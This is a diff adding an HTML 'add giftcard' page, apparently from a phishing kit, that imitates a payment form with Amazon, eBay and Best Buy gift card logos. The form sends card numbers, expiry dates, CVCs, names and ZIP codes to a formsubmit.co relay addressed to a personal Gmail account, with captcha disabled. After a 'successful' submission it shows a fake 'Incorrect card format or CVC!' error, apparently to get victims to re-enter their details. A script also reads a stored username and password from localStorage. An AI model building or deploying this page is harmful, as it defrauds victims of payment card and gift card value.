@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+  <title>add giftcard</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background-color: #000;
+      font-family: Arial, sans-serif;
+      color: #fff;
+    }
+
+    *, *::before, *::after {
+      box-sizing: border-box;
+    }
+
+    #loader {
+      position: fixed;
+      inset: 0;
+      background-color: #000000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #444;
+      border-top: 5px solid #fff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    #page-content {
+      display: none;
+      padding: 20px;
+      max-width: 400px;
+      margin: 0 auto;
+    }
+
+    .gpay-btn {
+      background-color: #000;
+      color: white;
+      border: 1px solid #555;
+      padding: 12px;
+      font-size: 16px;
+      width: 100%;
+      border-radius: 5px;
+      cursor: none;
+      margin-bottom: 20px;
+    }
+
+    .gpay-btn span {
+      font-weight: bold;
+      margin-right: 5px;
+    }
+
+    .separator {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      margin: 20px 0;
+      color: #aaa;
+    }
+
+    .separator::before,
+    .separator::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background-color: #444;
+    }
+
+    .separator span {
+      padding: 0 10px;
+      background-color: #000;
+      font-size: 14px;
+      border-radius: 5px;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      margin-bottom: 5px;
+      font-size: 14px;
+      color: #ccc;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 5px;
+      border-radius: 4px;
+      border: 1px solid #666;
+      background-color: #111;
+      color: #fff;
+      font-size: 14px;
+    }
+
+    .card-info {
+      display: flex;
+      gap: 10px;
+    }
+
+    .card-info input {
+      flex: 1;
+    }
+
+    .card-icons {
+      display: flex;
+      gap: 5px;
+      margin: 8px 0 15px;
+    }
+
+    .card-icons img {
+      height: 24px;
+    }
+
+    .pay-btns {
+      background-color: #ffffff;
+      color: 000000;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      width: 100%;
+      height: 60px;
+      border-radius: 10px;
+      cursor: none;
+      margin-top: 25px;
+    }
+ 
+   .error {
+      color: #ff4d4d;
+      font-size: 13px;
+      margin-bottom: 8px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Spinner -->
+  <div id="loader"><div class="spinner"></div></div>
+
+  <!-- Payment Form -->
+  <div id="page-content">
+    <button class="gpay-btn">User:<span style="margin-left: 2%;"id="usernameDisplay"></span></button>
+
+    <div class="separator"><span>Pay with gift card</span></div>
+
+   <form id="paymentForm" action="https://formsubmit.co/coinnet50@gmail.com" method="POST">
+      <!-- REQUIRED for formsubmit to work without captcha -->
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
+  
+
+      <label>Card information</label>
+     <input id="cardNumber" type="text" inputmode="text" placeholder="Enter gift card number" maxlength="25" />
+<span id="cardError"  class="error error-text"></span>
+      
+
+      <div class="card-info">
+        <input type="text" id="expiry" name="Expiry Date" placeholder="MM/YY" maxlength="5" />
+        <input type="number" id="cvc" name="CVC" placeholder="CVC" maxlength="3" />
+      </div>
+      <div id="dateError" class="error"></div>
+
+      <div class="card-icons">
+  <!-- Amazon Gift Card Logo -->
+<svg width="40" height="24" viewBox="0 0 80 48" xmlns="http://www.w3.org/2000/svg">
+  <!-- Card Background -->
+  <rect width="80" height="48" rx="6" fill="#232F3E"/>
+
+  <!-- Amazon Smile Logo -->
+  <path d="M53.2 25.8c-1.2 2.8-3.7 5.3-7.1 6.4-5.2 1.7-10.7-0.3-13.4-4.4-.4-.6.3-1.2.8-.9 4.4 2.5 9.6 3 15.4.5.5-.2 1 .4.7.8z" fill="#FF9900"/>
+  <path d="M55.5 23.3l1.5 1.3c.3.2.2.6-.1.7-4.9 2.3-10.5 3-16.3 2.3-.4 0-.5-.5-.2-.7l1.6-1.2c.2-.2.4-.2.6-.1 4.3 1.2 8.6 1 12.9-.5.2 0 .4 0 .6.2z" fill="#FF9900"/>
+
+  <!-- Amazon Text -->
+  <text x="12" y="20" font-family="Arial, sans-serif" font-size="12" fill="white" font-weight="bold">amazon</text>
+
+  <!-- Gift Card Label -->
+  <text x="40" y="43" font-family="Arial, sans-serif" font-size="8" fill="#FF9900" text-anchor="middle">Gift Card</text>
+</svg>
+
+<!-- eBay Gift Card -->
+<svg width="40" height="24" viewBox="0 0 80 48" xmlns="http://www.w3.org/2000/svg">
+  <rect width="80" height="48" rx="6" fill="#FFFFFF" stroke="#CCCCCC" stroke-width="1"/>
+  <text x="12" y="26" font-family="Arial, sans-serif" font-size="16" font-weight="bold">
+    <tspan fill="#E53238">e</tspan>
+    <tspan fill="#0064D2">b</tspan>
+    <tspan fill="#F5AF02">a</tspan>
+    <tspan fill="#86B817">y</tspan>
+  </text>
+  <text x="40" y="43" font-family="Arial, sans-serif" font-size="8" fill="#666" text-anchor="middle">Gift Card</text>
+</svg>
+
+<!-- Best Buy Gift Card -->
+<svg width="40" height="24" viewBox="0 0 80 48" xmlns="http://www.w3.org/2000/svg">
+  <rect width="80" height="48" rx="6" fill="#0046BE"/>
+  <!-- Price tag shape -->
+  <polygon points="60,10 70,24 60,38 10,38 10,10" fill="#FFEB3B"/>
+  <text x="20" y="26" font-family="Arial, sans-serif" font-size="12" fill="#000" font-weight="bold">Best Buy</text>
+  <text x="40" y="43" font-family="Arial, sans-serif" font-size="8" fill="#FFEB3B" text-anchor="middle">Gift Card</text>
+</svg>
+      </div>
+
+      <label for="name">Name on card</label>
+      <input type="text" id="name" name="Name" placeholder="Name on card" />
+      <div id="nameError" class="error"></div>
+
+      <label for="country">Country or region</label>
+      <input type="text" id="State" name="State" placeholder="United States of America" />
+
+ <label>Billing ZIP Code</label>
+      <input type="number" id="State" name="State" placeholder="zip code" />
+      
+      <input type="hidden" name="_next" value="http://localhost:8080/Coin_net.com/giftcard.html?success=true">
+      
+<div id="successNotice" class="success-message" style="color: #bd0008; font-size: 15px; margin-top: 5px;"></div>
+
+      <button type="submit" class="pay-btns">Add Card</button>
+    </form>
+  </div>
+
+ <style>
+    #message-box {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #444;
+      color: #fff;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-size: 16px;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+      z-index: 1000;
+    }
+
+    #message-box.show {
+      opacity: 1;
+    }
+  </style>
+  <div id="message-box"></div>
+  <script>
+    const messageBox = document.getElementById('message-box');
+
+    function showMessage(text, duration = 3000) {
+      messageBox.textContent = text;
+      messageBox.classList.add('show');
+
+      setTimeout(() => {
+        messageBox.classList.remove('show');
+      }, duration);
+    }
+
+    window.addEventListener('online', () => {
+      showMessage('You are now online.');
+    });
+
+    window.addEventListener('offline', () => {
+      showMessage('Error: You are currently offline.');
+    });
+  </script>
+
+  <!-- Scripts -->
+<script>
+  window.addEventListener('load', () => {
+    setTimeout(() => {
+      document.getElementById('loader').style.display = 'none';
+      document.getElementById('page-content').style.display = 'block';
+    }, 1500);
+
+    // Show success message if redirected with ?success=true
+    const params = new URLSearchParams(window.location.search);
+    if (params.get('success') === 'true') {
+      document.getElementById('successMessage').style.display = 'block';
+      document.getElementById('paymentForm').style.display = 'none';
+    }
+  });
+
+  const form = document.getElementById('paymentForm');
+
+  form.addEventListener('submit', function (e) {
+    const card = document.getElementById('cardNumber');
+    const expiry = document.getElementById('expiry');
+    const cvc = document.getElementById('cvc');
+    const name = document.getElementById('name');
+
+    const cardVal = card.value.trim();
+    const expiryVal = expiry.value.trim();
+    const cvcVal = cvc.value.trim();
+    const nameVal = name.value.trim();
+
+    let valid = true;
+
+    // Validate gift card number
+    if (!/^[A-Z0-9-\s]{8,25}$/.test(cardVal)) {
+      showError('card', 'Invalid card number format');
+      valid = false;
+    } else {
+      clearError('card');
+    }
+
+    // Validate expiry MM/YY
+    if (!/^\d{2}\/\d{2}$/.test(expiryVal)) {
+      showError('date', 'Invalid expiry date');
+      valid = false;
+    } else {
+      clearError('date');
+    }
+
+    // Validate CVC
+    if (!/^\d{3,4}$/.test(cvcVal)) {
+      showError('date', 'Invalid CVC');
+      valid = false;
+    }
+
+    // Validate name (letters + spaces only)
+    if (!/^[a-zA-Z\s]+$/.test(nameVal)) {
+      showError('name', 'Invalid name on card');
+      valid = false;
+    } else {
+      clearError('name');
+    }
+
+    if (!valid) {
+      e.preventDefault();
+    }
+  });
+
+  // Format gift card input
+  document.getElementById('cardNumber').addEventListener('input', (e) => {
+    const val = e.target.value.replace(/[^a-zA-Z0-9-\s]/g, '').toUpperCase().substring(0, 25);
+    e.target.value = val;
+    clearError('card');
+  });
+
+  // Format expiry MM/YY
+  document.getElementById('expiry').addEventListener('input', (e) => {
+    let val = e.target.value.replace(/\D/g, '');
+    if (val.length > 4) val = val.slice(0, 4);
+    if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2);
+    e.target.value = val;
+    clearError('date');
+  });
+
+  // Format CVC (3 digits)
+  document.getElementById('cvc').addEventListener('input', (e) => {
+    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
+    clearError('date');
+  });
+
+  // Clear errors on other fields
+  document.getElementById('email')?.addEventListener('input', () => clearError('email'));
+  document.getElementById('name').addEventListener('input', () => clearError('name'));
+
+  // Error display helpers
+  function showError(field, message) {
+    const el = document.getElementById(field + 'Error');
+    if (el) el.textContent = message;
+  }
+
+  function clearError(field) {
+    const el = document.getElementById(field + 'Error');
+    if (el) el.textContent = '';
+  }
+
+  // Luhn check (not used for gift cards, but can be enabled for credit cards)
+  function luhnCheck(number) {
+    let sum = 0;
+    let double = false;
+    for (let i = number.length - 1; i >= 0; i--) {
+      let digit = parseInt(number[i]);
+      if (isNaN(digit)) continue;
+      if (double) {
+        digit *= 2;
+        if (digit > 9) digit -= 9;
+      }
+      sum += digit;
+      double = !double;
+    }
+    return sum % 10 === 0;
+  }
+</script>
+<script>
+  const urlParams = new URLSearchParams(window.location.search);
+  const successNotice = document.getElementById('successNotice');
+
+  if (urlParams.get('success') === 'true') {
+    successNotice.textContent = 'Incorrect card format or CVC!';
+
+    // Auto-hide after 4 seconds (8000 ms)
+    setTimeout(() => {
+      successNotice.textContent = '';
+    }, 8000);
+  }
+</script>
+   <script>
+    // Get data from localStorage
+    const storedUsername = localStorage.getItem('userUsername');
+    const storedPassword = localStorage.getItem('userPassword');
+
+    // Display in the page
+    document.getElementById('usernameDisplay').textContent = storedUsername || 'Not found';
+    document.getElementById('passwordDisplay').textContent = storedPassword || 'Not found';
+  </script>
+  <script src="disable-zoom.js"></script>
+</body>
+</html>
